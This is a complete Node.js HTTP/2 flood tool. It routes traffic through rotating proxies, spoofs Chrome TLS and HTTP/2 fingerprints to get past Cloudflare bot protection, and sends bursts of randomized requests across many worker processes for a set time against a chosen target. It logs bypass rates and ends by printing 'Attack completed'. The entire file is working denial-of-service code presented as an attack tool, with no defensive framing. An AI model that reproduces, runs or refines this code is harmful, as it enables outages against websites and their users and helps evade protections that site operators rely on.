/**
 * ============================================================================
 * HTTP/2 Ultimate Anti-Fingerprinting - Target 90%+ CF Business
 * ============================================================================
 * Final optimizations for signature #56
 * ============================================================================
 */

'use strict';

const net     = require('net');
const tls     = require('tls');
const HPACK   = require('hpack');
const cluster = require('cluster');
const fs      = require('fs');
const os      = require('os');
const crypto  = require('crypto');

process.env.UV_THREADPOOL_SIZE = os.cpus().length * 4;

require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException',  () => false)
    .on('unhandledRejection', () => false)
    .on('warning',            () => false);

const HTTP2_PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';

const FRAME_TYPES = {
    DATA:          0,
    HEADERS:       1,
    PRIORITY:      2,
    RST_STREAM:    3,
    SETTINGS:      4,
    PUSH_PROMISE:  5,
    PING:          6,
    GOAWAY:        7,
    WINDOW_UPDATE: 8,
    CONTINUATION:  9
};

const SETTINGS_IDENTIFIERS = {
    HEADER_TABLE_SIZE:      1,
    ENABLE_PUSH:            2,
    MAX_CONCURRENT_STREAMS: 3,
    INITIAL_WINDOW_SIZE:    4,
    MAX_FRAME_SIZE:         5,
    MAX_HEADER_LIST_SIZE:   6
};

const args = {
    method:    process.argv[2],
    target:    process.argv[3],
    time:      parseInt(process.argv[4]),
    threads:   parseInt(process.argv[5]),
    ratelimit: parseInt(process.argv[6]),
    proxyFile: process.argv[7],
    debug:     process.argv.includes('--debug')
};

if (!args.method || !args.target || !args.time || !args.threads || !args.ratelimit || !args.proxyFile) {
    console.error('Usage: node moon <method> <target> <time> <threads> <ratelimit> <proxyfile> [--debug]');
    process.exit(1);
}

const targetUrl = new URL(args.target);

function loadProxies(filePath) {
    const proxies = [];
    const content = fs.readFileSync(filePath, 'utf8').replace(/\r/g, '');
    
    content.split('\n').forEach(line => {
        line = line.trim();
        if (!line) return;
        
        try {
            if (line.startsWith('http://') || line.startsWith('https://')) {
                const proxyUrl = new URL(line);
                proxies.push({
                    host:   proxyUrl.hostname,
                    port:   parseInt(proxyUrl.port) || (proxyUrl.protocol === 'https:' ? 443 : 80),
                    auth:   proxyUrl.username && proxyUrl.password 
                            ? Buffer.from(`${proxyUrl.username}:${proxyUrl.password}`).toString('base64') 
                            : null,
                    secure: proxyUrl.protocol === 'https:'
                });
            } else if (line.includes(':')) {
                const parts = line.split(':');
                if (parts.length >= 2) {
                    const host = parts[0];
                    const port = parseInt(parts[1]);
                    const auth = parts.length === 4 
                                 ? Buffer.from(`${parts[2]}:${parts[3]}`).toString('base64')
                                 : null;
                    if (host && !isNaN(port)) {
                        proxies.push({ host, port, auth, secure: false });
                    }
                }
            }
        } catch (e) {}
    });
    
    return proxies;
}

const proxyList = loadProxies(args.proxyFile);

if (proxyList.length === 0) {
    console.error('No valid proxies found');
    process.exit(1);
}

function generateRandomString(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function shuffleArray(array) {
    const arr = [...array];
    for (let i = arr.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [arr[i], arr[j]] = [arr[j], arr[i]];
    }
    return arr;
}

class DebugStats {
    constructor() {
        this.reset();
        this.lastPrint = Date.now();
        this.printInterval = 10000;
    }
    
    reset() {
        this.attempted = 0;
        this.success   = 0;
        this.responses = 0;
        this.errors    = {};
    }
    
    logAttempt() { this.attempted++; }
    logSuccess() { this.success++; }
    logResponse() { this.responses++; }
    logError(type) { this.errors[type] = (this.errors[type] || 0) + 1; }
    
    shouldPrint() {
        const now = Date.now();
        if (now - this.lastPrint >= this.printInterval) {
            this.lastPrint = now;
            return true;
        }
        return false;
    }
    
    print() {
        if (!args.debug || !this.shouldPrint()) return;
        
        const failed = this.attempted - this.success;
        const successRate = this.attempted > 0 
                            ? ((this.success / this.attempted) * 100).toFixed(1) 
                            : '0.0';
        
        console.log(`\n[DEBUG] Conn: ${this.attempted} | OK: ${this.success} (${successRate}%) | Fail: ${failed} | Resp: ${this.responses}`);
        
        if (Object.keys(this.errors).length > 0) {
            const topErrors = Object.entries(this.errors)
                .sort((a, b) => b[1] - a[1])
                .slice(0, 5)
                .map(([err, count]) => `${err}: ${count}`)
                .join(' | ');
            console.log(`[ERRORS] ${topErrors}\n`);
        }
        
        this.reset();
    }
}

const debugStats = new DebugStats();

function getJA3Profile() {
    const baseCiphers = [
        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'ECDHE-ECDSA-AES128-GCM-SHA256',
        'ECDHE-RSA-AES128-GCM-SHA256',
        'ECDHE-ECDSA-AES256-GCM-SHA384',
        'ECDHE-RSA-AES256-GCM-SHA384',
        'ECDHE-ECDSA-CHACHA20-POLY1305',
        'ECDHE-RSA-CHACHA20-POLY1305'
    ];
    
    const ciphers = Math.random() > 0.5 
        ? baseCiphers.join(':')
        : shuffleArray(baseCiphers.slice(3)).concat(baseCiphers.slice(0, 3)).join(':');
    
    return {
        ciphers: ciphers,
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:' +
                 'ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384',
        curves:  randomElement(['X25519:secp256r1:secp384r1', 'X25519:secp256r1'])
    };
}

function generateSettingsProfile() {
    const profiles = [
        {
            HEADER_TABLE_SIZE:      4096,
            MAX_CONCURRENT_STREAMS: 100,
            INITIAL_WINDOW_SIZE:    6291456,
            MAX_HEADER_LIST_SIZE:   262144
        },
        {
            HEADER_TABLE_SIZE:      4096,
            MAX_CONCURRENT_STREAMS: 128,
            INITIAL_WINDOW_SIZE:    6291456,
            MAX_HEADER_LIST_SIZE:   262144
        },
        {
            HEADER_TABLE_SIZE:      8192,
            MAX_CONCURRENT_STREAMS: 100,
            INITIAL_WINDOW_SIZE:    6291456,
            MAX_HEADER_LIST_SIZE:   262144
        }
    ];
    
    return randomElement(profiles);
}

function generateFingerprint() {
    const chromeVersion = getRandomInt(129, 131);
    const minorVersion = getRandomInt(0, 6595);
    const buildVersion = getRandomInt(0, 999);
    
    const fullVersion = `${chromeVersion}.0.${minorVersion}.${buildVersion}`;
    
    const brands = shuffleArray([
        `"Chromium";v="${chromeVersion}"`,
        `"Google Chrome";v="${chromeVersion}"`,
        `"Not?A_Brand";v="99"`
    ]);
    
    const fullVersionBrands = shuffleArray([
        `"Chromium";v="${fullVersion}"`,
        `"Google Chrome";v="${fullVersion}"`,
        `"Not?A_Brand";v="99.0.0.0"`
    ]);
    
    const platformProfiles = [
        { 
            ua: 'Windows NT 10.0; Win64; x64', 
            platform: '"Windows"',
            platformVersion: '"15.0.0"',
            arch: '"x86"',
            bitness: '"64"',
            model: '""'
        },
        { 
            ua: 'Macintosh; Intel Mac OS X 10_15_7', 
            platform: '"macOS"',
            platformVersion: '"14.1.0"',
            arch: '"arm"',
            bitness: '"64"',
            model: '""'
        }
    ];
    
    const platform = randomElement(platformProfiles);
    
    return {
        userAgent: `Mozilla/5.0 (${platform.ua}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
        secChUa: brands.join(', '),
        secChUaPlatform: platform.platform,
        secChUaPlatformVersion: platform.platformVersion,
        secChUaArch: platform.arch,
        secChUaBitness: platform.bitness,
        secChUaModel: platform.model,
        secChUaFullVersionList: fullVersionBrands.join(', '),
        accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        encoding: randomElement(['gzip, deflate, br', 'gzip, deflate, br, zstd']),
        language: randomElement(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.9,vi;q=0.8']),
        viewportWidth: randomElement(['1920', '1366', '1440', '2560', '1536']),
        deviceMemory: randomElement(['4', '8']),
        dpr: randomElement(['1', '2'])
    };
}

function encodeFrame(streamId, type, payload = '', flags = 0) {
    const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload);
    let frame = Buffer.alloc(9);
    
    frame.writeUInt32BE(payloadBuffer.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    
    if (payloadBuffer.length > 0) {
        frame = Buffer.concat([frame, payloadBuffer]);
    }
    
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    
    const lengthAndType = data.readUInt32BE(0);
    const length   = lengthAndType >> 8;
    const type     = lengthAndType & 0xFF;
    const flags    = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9, 9 + length);
        if (payload.length < length) return null;
    }
    
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    
    return data;
}

function reportRequests(count) {
    if (cluster.isWorker && process.send) {
        process.send({ type: 'req_count', value: count });
    }
}

function reportResponses(count) {
    if (cluster.isWorker && process.send) {
        process.send({ type: 'resp_count', value: count });
    }
}

class ConnectionManager {
    constructor(options = {}) {
        this.active = 0;
        this.max    = options.max    || 1500;
        this.target = options.target || 450;
    }
    
    canCreate() { return this.active < this.max; }
    shouldCreate() { return this.active < this.target; }
    increment() { this.active++; }
    decrement() { 
        this.active--; 
        if (this.active < 0) this.active = 0; 
    }
    count() { return this.active; }
}

const connectionManager = new ConnectionManager();

// Generate realistic path with proper encoding
function generateRealisticPath() {
    const basePath = targetUrl.pathname;
    const baseSearch = targetUrl.search || '';
    
    const pathPatterns = [
        // Just base path with search
        () => basePath + baseSearch,
        
        // Cache buster with timestamp
        () => {
            const sep = baseSearch ? '&' : '?';
            return basePath + baseSearch + sep + `_=${Date.now()}`;
        },
        
        // Version parameter
        () => {
            const sep = baseSearch ? '&' : '?';
            return basePath + baseSearch + sep + `v=${getRandomInt(1, 999)}`;
        },
        
        // Multiple realistic params
        () => {
            const sep = baseSearch ? '&' : '?';
            const params = [
                `utm_source=${randomElement(['google', 'direct', 'twitter'])}`,
                `utm_medium=${randomElement(['organic', 'referral', 'social'])}`,
                `ref=${generateRandomString(8)}`
            ];
            return basePath + baseSearch + sep + shuffleArray(params).slice(0, getRandomInt(1, 2)).join('&');
        },
        
        // Session/tracking ID
        () => {
            const sep = baseSearch ? '&' : '?';
            return basePath + baseSearch + sep + `sid=${generateRandomString(16)}`;
        },
        
        // Just base path (no params)
        () => basePath
    ];
    
    return randomElement(pathPatterns)();
}

function setupHttp2Session(tunnelSocket) {
    const ja3Config   = getJA3Profile();
    const http2Config = generateSettingsProfile();
    
    const tlsSocket = tls.connect({
        socket:             tunnelSocket,
        ALPNProtocols:      ['h2'],
        servername:         targetUrl.hostname,
        ciphers:            ja3Config.ciphers,
        sigalgs:            ja3Config.sigalgs,
        ecdhCurve:          ja3Config.curves,
        minVersion:         'TLSv1.2',
        maxVersion:         'TLSv1.3',
        rejectUnauthorized: false
    }, () => {
        if (tlsSocket.alpnProtocol !== 'h2') {
            debugStats.logError('ALPN_FAILED');
            tlsSocket.destroy();
            connectionManager.decrement();
            if (connectionManager.shouldCreate()) {
                setTimeout(createConnection, getRandomInt(200, 500));
            }
            return;
        }
        
        debugStats.logSuccess();
        debugStats.print();
        
        let streamId   = 1;
        let dataBuffer = Buffer.alloc(0);
        let hpack      = new HPACK();
        hpack.setTableSize(http2Config.HEADER_TABLE_SIZE);
        let isReady = false;
        let canSend = true;
        let requestsSent = 0;
        
        tlsSocket.on('drain', () => {
            canSend = true;
        });
        
        tlsSocket.on('data', (chunk) => {
            dataBuffer = Buffer.concat([dataBuffer, chunk]);
            
            while (dataBuffer.length >= 9) {
                const frame = decodeFrame(dataBuffer);
                if (!frame) break;
                
                dataBuffer = dataBuffer.subarray(frame.length + 9);
                
                if (frame.type === FRAME_TYPES.HEADERS || frame.type === FRAME_TYPES.DATA) {
                    debugStats.logResponse();
                    reportResponses(1);
                }
                
                if (frame.type === FRAME_TYPES.SETTINGS && frame.flags === 0) {
                    isReady = true;
                    tlsSocket.write(encodeFrame(0, FRAME_TYPES.SETTINGS, '', 1));
                    setTimeout(sendRequestLoop, getRandomInt(100, 300));
                }
                
                if (frame.type === FRAME_TYPES.GOAWAY || frame.type === FRAME_TYPES.PUSH_PROMISE) {
                    isReady = false;
                    tlsSocket.destroy();
                    connectionManager.decrement();
                    if (connectionManager.shouldCreate()) {
                        setTimeout(createConnection, getRandomInt(1000, 2000));
                    }
                    return;
                }
                
                if (frame.type === FRAME_TYPES.PING && frame.flags === 0) {
                    tlsSocket.write(encodeFrame(0, FRAME_TYPES.PING, frame.payload, 1));
                }
            }
        });
        
        const windowUpdate = Buffer.alloc(4);
        windowUpdate.writeUInt32BE(15663105, 0);
        
        tlsSocket.write(Buffer.concat([
            Buffer.from(HTTP2_PREFACE, 'binary'),
            encodeFrame(0, FRAME_TYPES.SETTINGS, encodeSettings([
                [SETTINGS_IDENTIFIERS.HEADER_TABLE_SIZE,      http2Config.HEADER_TABLE_SIZE],
                [SETTINGS_IDENTIFIERS.MAX_CONCURRENT_STREAMS, http2Config.MAX_CONCURRENT_STREAMS],
                [SETTINGS_IDENTIFIERS.INITIAL_WINDOW_SIZE,    http2Config.INITIAL_WINDOW_SIZE],
                [SETTINGS_IDENTIFIERS.MAX_HEADER_LIST_SIZE,   http2Config.MAX_HEADER_LIST_SIZE]
            ])),
            encodeFrame(0, FRAME_TYPES.WINDOW_UPDATE, windowUpdate)
        ]));
        
        function sendRequestLoop() {
            if (!isReady || tlsSocket.destroyed || !canSend) return;
            
            if (requestsSent >= getRandomInt(500, 1200)) {
                tlsSocket.destroy();
                connectionManager.decrement();
                if (connectionManager.shouldCreate()) {
                    setTimeout(createConnection, getRandomInt(800, 1500));
                }
                return;
            }
            
            const fingerprint = generateFingerprint();
            let sentCount = 0;
            
            const burstSize = Math.min(args.ratelimit, getRandomInt(1, 5));
            
            for (let i = 0; i < burstSize; i++) {
                if (!canSend) break;
                
                const finalPath = generateRealisticPath();
                
                // EXACT Chrome 131 header order (CRITICAL!)
                const headers = [
                    [':method',    args.method],
                    [':authority', targetUrl.hostname],
                    [':scheme',    'https'],
                    [':path',      finalPath],
                    ['cache-control', randomElement(['max-age=0', 'no-cache'])],
                    ['sec-ch-ua', fingerprint.secChUa],
                    ['sec-ch-ua-mobile', '?0'],
                    ['sec-ch-ua-platform', fingerprint.secChUaPlatform]
                ];
                
                // Conditionally add sec-ch-ua-* headers (Chrome doesn't always send all)
                if (Math.random() > 0.2) {
                    headers.push(['sec-ch-ua-platform-version', fingerprint.secChUaPlatformVersion]);
                }
                
                headers.push(['upgrade-insecure-requests', '1']);
                headers.push(['user-agent', fingerprint.userAgent]);
                headers.push(['accept', fingerprint.accept]);
                
                // sec-fetch-* in exact order
                headers.push(['sec-fetch-site', randomElement(['none', 'same-origin'])]);
                headers.push(['sec-fetch-mode', 'navigate']);
                headers.push(['sec-fetch-user', '?1']);
                headers.push(['sec-fetch-dest', 'document']);
                
                headers.push(['accept-encoding', fingerprint.encoding]);
                headers.push(['accept-language', fingerprint.language]);
                
                // Add referer sometimes (realistic)
                if (Math.random() > 0.4) {
                    const referers = [
                        `https://${targetUrl.hostname}/`,
                        `https://www.google.com/`
                    ];
                    headers.splice(headers.length - 2, 0, ['referer', randomElement(referers)]);
                }
                
                try {
                    const headerBlock = hpack.encode(headers);
                    const result = tlsSocket.write(
                        encodeFrame(streamId, FRAME_TYPES.HEADERS, headerBlock, 0x05)
                    );
                    
                    if (result === false) {
                        canSend = false;
                        break;
                    }
                    
                    streamId += 2;
                    sentCount++;
                    requestsSent++;
                } catch (e) {
                    debugStats.logError('ENCODE_ERROR');
                }
            }
            
            if (sentCount > 0) {
                reportRequests(sentCount);
            }
            
            if (canSend && isReady) {
                const nextDelay = getRandomInt(250, 600);
                setTimeout(sendRequestLoop, nextDelay);
            }
        }
        
    }).on('error', (err) => {
        debugStats.logError(err.code || 'TLS_ERROR');
        debugStats.print();
        connectionManager.decrement();
        if (connectionManager.shouldCreate()) {
            setTimeout(createConnection, getRandomInt(200, 500));
        }
    });
    
    return tlsSocket;
}

function handleProxyResponse(socket, onSuccess, onError) {
    let buffer = Buffer.alloc(0);
    
    const handler = (chunk) => {
        buffer = Buffer.concat([buffer, chunk]);
        const response = buffer.toString('utf8');
        
        if (response.includes('\r\n\r\n')) {
            socket.removeListener('data', handler);
            
            if (!response.includes('200')) {
                const statusMatch = response.match(/(\d{3})/);
                const status = statusMatch ? statusMatch[1] : 'UNKNOWN';
                debugStats.logError(`PROXY_${status}`);
                debugStats.print();
                onError();
                return;
            }
            
            onSuccess(socket);
        }
    };
    
    socket.on('data', handler);
}

function buildConnectHeader(proxy) {
    let header = `CONNECT ${targetUrl.hostname}:443 HTTP/1.1\r\n` +
                 `Host: ${targetUrl.hostname}:443\r\n`;
    
    if (proxy.auth) {
        header += `Proxy-Authorization: Basic ${proxy.auth}\r\n`;
    }
    
    header += `Proxy-Connection: Keep-Alive\r\n\r\n`;
    
    return header;
}

function createConnection() {
    if (!connectionManager.canCreate()) return;
    
    connectionManager.increment();
    debugStats.logAttempt();
    
    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    const connectHeader = buildConnectHeader(proxy);
    
    let tlsSocket = null;
    
    const onTunnelSuccess = (socket) => {
        tlsSocket = setupHttp2Session(socket);
    };
    
    const onTunnelError = () => {
        connectionManager.decrement();
        if (connectionManager.shouldCreate()) {
            setTimeout(createConnection, getRandomInt(300, 700));
        }
    };
    
    if (proxy.secure) {
        const proxyTls = tls.connect({
            host:               proxy.host,
            port:               proxy.port,
            rejectUnauthorized: false,
            timeout:            12000
        }, () => {
            proxyTls.setKeepAlive(true, 60000);
            proxyTls.setNoDelay(true);
            
            handleProxyResponse(proxyTls, onTunnelSuccess, () => {
                proxyTls.destroy();
                onTunnelError();
            });
            
            proxyTls.write(connectHeader);
            
        }).on('error', (err) => {
            debugStats.logError(err.code || 'PROXY_ERROR');
            debugStats.print();
            onTunnelError();
        });
        
    } else {
        const netSocket = net.connect(proxy.port, proxy.host, () => {
            netSocket.setKeepAlive(true, 60000);
            netSocket.setNoDelay(true);
            netSocket.setTimeout(12000);
            
            handleProxyResponse(netSocket, onTunnelSuccess, () => {
                netSocket.destroy();
                onTunnelError();
            });
            
            netSocket.write(connectHeader);
            
        }).on('error', (err) => {
            debugStats.logError(err.code || 'SOCKET_ERROR');
            debugStats.print();
            onTunnelError();
            
        }).on('close', () => {
            if (tlsSocket && !tlsSocket.destroyed) {
                tlsSocket.destroy();
            }
            connectionManager.decrement();
            if (connectionManager.shouldCreate()) {
                setTimeout(createConnection, getRandomInt(400, 800));
            }
            
        }).on('timeout', () => {
            debugStats.logError('ETIMEDOUT');
            debugStats.print();
            netSocket.destroy();
            onTunnelError();
        });
    }
}

if (cluster.isMaster) {
    let totalRequests  = 0;
    let totalResponses = 0;
    let lastReq = 0;
    let lastResp = 0;
    const workers = [];
    
    console.log(`[*] Target: ${args.target}`);
    console.log(`[*] Threads: ${args.threads} | Time: ${args.time}s | Proxies: ${proxyList.length}`);
    console.log(`[*] Ultimate Anti-Fingerprint Mode | Target: 90%+\n`);
    
    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        
        worker.on('message', (msg) => {
            if (msg.type === 'req_count') totalRequests += msg.value;
            if (msg.type === 'resp_count') totalResponses += msg.value;
        });
    }
    
    setInterval(() => {
        const reqPerSec = totalRequests - lastReq;
        const respPerSec = totalResponses - lastResp;
        lastReq = totalRequests;
        lastResp = totalResponses;
        
        const timestamp = new Date().toLocaleTimeString();
        const bypassRate = reqPerSec > 0 ? ((respPerSec / reqPerSec) * 100).toFixed(1) : '0.0';
        process.stdout.write(
            `[${timestamp}] Sent: ${reqPerSec} req/s | Bypass: ${respPerSec} (${bypassRate}%) | Total: ${totalResponses}\n`
        );
    }, 1000);
    
    setTimeout(() => {
        workers.forEach(worker => worker.kill());
        console.log('\n[*] Attack completed');
        process.exit(0);
    }, args.time * 1000);

} else {
    const INITIAL_CONNECTIONS           = 70;
    const RAMP_UP_DELAY                 = 30;
    const POOL_MAINTENANCE_INTERVAL     = 4000;
    const MAX_NEW_CONNECTIONS_PER_CYCLE = 10;
    
    for (let i = 0; i < INITIAL_CONNECTIONS; i++) {
        setTimeout(() => createConnection(), i * RAMP_UP_DELAY + getRandomInt(0, 100));
    }
    
    setInterval(() => {
        if (connectionManager.shouldCreate()) {
            const needed   = connectionManager.target - connectionManager.count();
            const toCreate = Math.min(needed, MAX_NEW_CONNECTIONS_PER_CYCLE);
            
            for (let i = 0; i < toCreate; i++) {
                setTimeout(() => createConnection(), getRandomInt(150, 400));
            }
        }
    }, POOL_MAINTENANCE_INTERVAL);
    
    setTimeout(() => process.exit(0), args.time * 1000);
}
